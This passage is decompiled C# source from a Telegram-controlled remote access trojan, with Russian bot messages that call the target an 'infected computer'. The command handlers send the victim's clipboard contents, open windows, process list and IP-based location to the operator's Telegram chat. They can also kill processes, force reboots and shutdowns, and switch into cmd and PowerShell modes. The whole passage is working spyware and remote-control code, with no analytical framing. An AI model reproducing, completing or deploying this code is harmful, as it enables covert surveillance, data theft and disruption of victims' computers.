							System.IO.File.Delete(Commands.directory + "Log_ClipBoard.txt");
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nСначала нужно включить ClipboardLogger (□_□)", false, 0, null, false);
							if (System.IO.File.Exists(Commands.directory + "Log_ClipBoard.txt"))
							{
								System.IO.File.Delete(Commands.directory + "Log_ClipBoard.txt");
							}
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser67.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /ClipboardLoggerSend", false, 0, null, false);
				};
				list89.Add(firstParser67);
				List<FirstParser> list90 = Commands.settings;
				FirstParser firstParser68 = new FirstParser();
				firstParser68.Command = "/ClipboardLoggerStop";
				firstParser68.CountArgs = 0;
				firstParser68.Example = "/ClipboardLoggerStop";
				firstParser68.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						if (Commands.Cbl)
						{
							Commands.Cbl = false;
							ClipChanger.StopLogger();
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВыключил <(￣︶￣)>", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nОн ещё и не начинал работать (￢_￢)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser68.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /ClipboardLoggerStop", false, 0, null, false);
				};
				list90.Add(firstParser68);
				List<FirstParser> list91 = Commands.commands;
				FirstParser firstParser69 = new FirstParser();
				firstParser69.Command = "/clipboard";
				firstParser69.CountArgs = 0;
				firstParser69.Example = "/clipboard";
				firstParser69.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						string text = ClipboardEx.GetText();
						if (!string.IsNullOrEmpty(text))
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
							{
								Environment.UserName,
								"/",
								Commands.pubIp,
								"\nВот такая вот хурма у него в буфере обмена:\n",
								text
							}), false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nЭтот чорт пока ничего не копировал  \n(〃＞＿＜;〃)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser69.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /clipboard", false, 0, null, false);
				};
				list91.Add(firstParser69);
				List<FirstParser> list92 = Commands.state;
				FirstParser firstParser70 = new FirstParser();
				firstParser70.Command = "/functions";
				firstParser70.CountArgs = 0;
				firstParser70.Example = "/functions";
				firstParser70.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						string[] files = Directory.GetFiles(Folders.functionsfolder);
						string text = "";
						for (int i = 0; i < files.Length; i++)
						{
							text = text + files[i].Replace(Folders.functionsfolder + "\\", "/") + "\n";
						}
						if (!string.IsNullOrEmpty(text))
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
							{
								Environment.UserName,
								"/",
								Commands.pubIp,
								"\n",
								text
							}), false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nНу тыж сначал сделай их ╮(︶︿︶)╭", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser70.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /functions", false, 0, null, false);
				};
				list92.Add(firstParser70);
				List<FirstParser> list93 = Commands.commands;
				FirstParser firstParser71 = new FirstParser();
				firstParser71.Command = "/activewindow";
				firstParser71.CountArgs = 0;
				firstParser71.Example = "/activewindow";
				firstParser71.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						string activeWindowTitle = RedirectAndBlock.GetActiveWindowTitle();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nСейчас активен: \n",
							activeWindowTitle
						}), false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser71.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /activewindow", false, 0, null, false);
				};
				list93.Add(firstParser71);
				List<FirstParser> list94 = Commands.commands;
				FirstParser firstParser72 = new FirstParser();
				firstParser72.Command = "/openwindows";
				firstParser72.CountArgs = 0;
				firstParser72.Example = "/openwindows";
				firstParser72.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						List<string> win = new List<string>();
						DLLImport.EnumWindows(delegate(IntPtr hWnd, IntPtr lParam)
						{
							if (DLLImport.IsWindowVisible(hWnd) && DLLImport.GetWindowTextLength(hWnd) != 0)
							{
								win.Add("\n" + Func.GetWindowText(hWnd));
							}
							return true;
						}, IntPtr.Zero);
						string text = string.Join(" ", win);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВсе открытые окошки на зараженном компухтере (o_O) :\n",
							text
						}), false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser72.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /openwindows", false, 0, null, false);
				};
				list94.Add(firstParser72);
				List<FirstParser> list95 = Commands.commands;
				FirstParser firstParser73 = new FirstParser();
				firstParser73.Command = "/collapsewindows";
				firstParser73.CountArgs = 0;
				firstParser73.Example = "/collapsewindows";
				firstParser73.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						DLLImport.SendMessage(DLLImport.FindWindow("Shell_TrayWnd", null), 273, (IntPtr)419, IntPtr.Zero);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nСвернул ему все окна (≧▽≦)", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser73.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /collapsewindows", false, 0, null, false);
				};
				list95.Add(firstParser73);
				List<FirstParser> list96 = Commands.commands;
				FirstParser firstParser74 = new FirstParser();
				firstParser74.Command = "/processlist";
				firstParser74.CountArgs = 0;
				firstParser74.Example = "/processlist";
				firstParser74.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						List<string> list109 = new List<string>();
						foreach (Process process in Process.GetProcesses())
						{
							list109.Add("\n" + process.ProcessName);
						}
						string text = string.Join(" ", list109);
						if (text.Length <= 4096)
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
							{
								Environment.UserName,
								"/",
								Commands.pubIp,
								"\n",
								text
							}), false, 0, null, false);
						}
						else
						{
							System.IO.File.AppendAllText(Commands.directory + "ProcessList.txt", text);
							using (FileStream stream = System.IO.File.OpenRead(Commands.directory + "ProcessList.txt"))
							{
								await Commands.Bot.SendDocument((long)update.Message.From.Id, new FileToSend("ProcessList.txt", stream), 0, null);
							}
							FileStream stream = null;
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					int i = num;
					object obj;
					if (i == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser74.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /processlist", false, 0, null, false);
				};
				list96.Add(firstParser74);
				List<FirstParser> list97 = Commands.commands;
				FirstParser firstParser75 = new FirstParser();
				firstParser75.Command = "/killprocess";
				firstParser75.CountArgs = 1;
				firstParser75.Example = "/killprocess [process]";
				firstParser75.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					int i;
					try
					{
						Process[] processesByName = Process.GetProcessesByName(model.Args.FirstOrDefault<string>());
						for (i = 0; i < processesByName.Length; i++)
						{
							processesByName[i].Kill();
						}
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nЧто он тебе сделал плохого? ゜(´Ｏ｀)°゜", false, 0, null, false);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nНо, нет! Я должен быть верен своему хояину (⇀‸↼‶)", false, 0, null, false);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nПроцесс убит!\n       (╯︵╰,)", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					i = num;
					object obj;
					if (i == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser75.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /killprocces [process]", false, 0, null, false);
				};
				list97.Add(firstParser75);
				List<FirstParser> list98 = Commands.commands;
				FirstParser firstParser76 = new FirstParser();
				firstParser76.Command = "/path";
				firstParser76.CountArgs = 0;
				firstParser76.Example = "/path";
				firstParser76.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						string executablePath = Application.ExecutablePath;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							executablePath
						}), false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser76.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /path", false, 0, null, false);
				};
				list98.Add(firstParser76);
				List<FirstParser> list99 = Commands.commands;
				FirstParser firstParser77 = new FirstParser();
				firstParser77.Command = "/location";
				firstParser77.CountArgs = 0;
				firstParser77.Example = "/location";
				firstParser77.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						string text = new WebClient().DownloadString("https://ipapi.co/" + Commands.pubIp + "/latlong/");
						string text2 = string.Concat(new string[]
						{
							"https://www.google.com/maps/search/",
							text,
							"/@",
							text,
							",17z"
						}).ToString();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВот здесь эта мыша:\n",
							text2.ToString()
						}), false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser77.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /location", false, 0, null, false);
				};
				list99.Add(firstParser77);
				List<FirstParser> list100 = Commands.commands;
				FirstParser firstParser78 = new FirstParser();
				firstParser78.Command = "/reboot";
				firstParser78.CountArgs = 0;
				firstParser78.Example = "/reboot";
				firstParser78.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Process.Start("cmd", "/c shutdown -r -t 0");
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nПерезагружаю его PC", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser78.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /reboot", false, 0, null, false);
				};
				list100.Add(firstParser78);
				List<FirstParser> list101 = Commands.commands;
				FirstParser firstParser79 = new FirstParser();
				firstParser79.Command = "/kill";
				firstParser79.CountArgs = 0;
				firstParser79.Example = "/kill";
				firstParser79.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nНу ты и отморозок", false, 0, null, false);
						Process.Start("cmd", "/c shutdown -s -f -t 00");
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУже выключаю ( ◡‿◡ *)", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser79.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /kill", false, 0, null, false);
				};
				list101.Add(firstParser79);
				List<FirstParser> list102 = Commands.commands;
				FirstParser firstParser80 = new FirstParser();
				firstParser80.Command = "/back";
				firstParser80.CountArgs = 0;
				firstParser80.Example = "/back";
				firstParser80.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Program.mode = true;
						Program.permstate = 1;
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"/getscreen"
								}
							}
						};
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Func.Back, false, 0, replyMarkup, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser80.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /back", false, 0, null, false);
				};
				list102.Add(firstParser80);
				List<FirstParser> list103 = Commands.grab;
				FirstParser firstParser81 = new FirstParser();
				firstParser81.Command = "/back";
				firstParser81.CountArgs = 0;
				firstParser81.Example = "/back";
				firstParser81.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Program.mode = true;
						Program.permstate = 1;
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"/getscreen"
								}
							}
						};
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Func.Back, false, 0, replyMarkup, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser81.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /back", false, 0, null, false);
				};
				list103.Add(firstParser81);
				List<SecondParser> list104 = Commands.filemanager;
				SecondParser secondParser23 = new SecondParser();
				secondParser23.Command = "/exit";
				secondParser23.Example = "/exit";
				secondParser23.Execute = async delegate(SecondModel model, Update update)
				{
					int num = 0;
					try
					{
						Program.mode = true;
						Program.permstate = 1;
						Program.cdpath = null;
						System.IO.File.Delete(Commands.directory + "log.txt");
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"/getscreen"
								}
							}
						};
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Файловый менеджер закрыт", false, 0, replyMarkup, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						Program.permstate = 1;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list104.Add(secondParser23);
				List<SecondParser> list105 = Commands.powershell;
				SecondParser secondParser24 = new SecondParser();
				secondParser24.Command = "/back";
				secondParser24.Example = "/back";
				secondParser24.Execute = async delegate(SecondModel model, Update update)
				{
					int num = 0;
					try
					{
						Program.mode = true;
						PowerShell.perm = false;
						Program.permstate = 1;
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"/getscreen"
								}
							}
						};
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Func.Back, false, 0, replyMarkup, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list105.Add(secondParser24);
				List<SecondParser> list106 = Commands.cmd;
				SecondParser secondParser25 = new SecondParser();
				secondParser25.Command = "/back";
				secondParser25.Example = "/back";
				secondParser25.Execute = async delegate(SecondModel model, Update update)
				{
					int num = 0;
					try
					{
						Program.mode = true;
						Cmd.perm = false;
						Program.permstate = 1;
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"/getscreen"
								}
							}
						};
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Func.Back, false, 0, replyMarkup, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list106.Add(secondParser25);
				List<SecondParser> list107 = Commands.simplecomp;
				SecondParser secondParser26 = new SecondParser();
				secondParser26.Command = "/back";
				secondParser26.Example = "/back";
				secondParser26.Execute = async delegate(SecondModel model, Update update)
				{
					int num = 0;
					try
					{
						Program.mode = true;
						Program.permstate = 1;
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"/getscreen"
								}
							}
						};
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Файловый менеджер закрыт", false, 0, replyMarkup, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						Program.permstate = 1;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list107.Add(secondParser26);
				List<FirstParser> list108 = Commands.settings;
				FirstParser firstParser82 = new FirstParser();
				firstParser82.Command = "/back";
				firstParser82.CountArgs = 0;
				firstParser82.Example = "/back";
				firstParser82.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Program.mode = true;
						Program.permstate = 1;
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"/getscreen"
								}
							}
						};
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Func.Back, false, 0, replyMarkup, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser82.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /back", false, 0, null, false);
				};
				list108.Add(firstParser82);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0400002F RID: 47
		public static List<FirstParser> commands = new List<FirstParser>();

		// Token: 0x04000030 RID: 48
		public static List<FirstParser> state = new List<FirstParser>();

		// Token: 0x04000031 RID: 49
		public static List<FirstParser> settings = new List<FirstParser>();

		// Token: 0x04000032 RID: 50
		public static List<FirstParser> grab = new List<FirstParser>();

		// Token: 0x04000033 RID: 51
		public static List<SecondParser> filemanager = new List<SecondParser>();

		// Token: 0x04000034 RID: 52
		public static List<SecondParser> simplecomp = new List<SecondParser>();

		// Token: 0x04000035 RID: 53
		public static List<SecondParser> cmd = new List<SecondParser>();

		// Token: 0x04000036 RID: 54
		public static List<SecondParser> powershell = new List<SecondParser>();

		// Token: 0x04000037 RID: 55
		private static Api Bot = Program.Bot;

		// Token: 0x04000038 RID: 56
		public static readonly string directory = Application.ExecutablePath.Replace(Path.GetFileName(Application.ExecutablePath), "");

		// Token: 0x04000039 RID: 57
		public static List<string> cd = new List<string>();

		// Token: 0x0400003A RID: 58
		public static bool Clp = false;

		// Token: 0x0400003B RID: 59
		public static bool Cbl = false;

		// Token: 0x0400003C RID: 60
		public static bool Scr = false;

		// Token: 0x0400003D RID: 61
		public static string pubIp = Program.GetIP();
	}
}
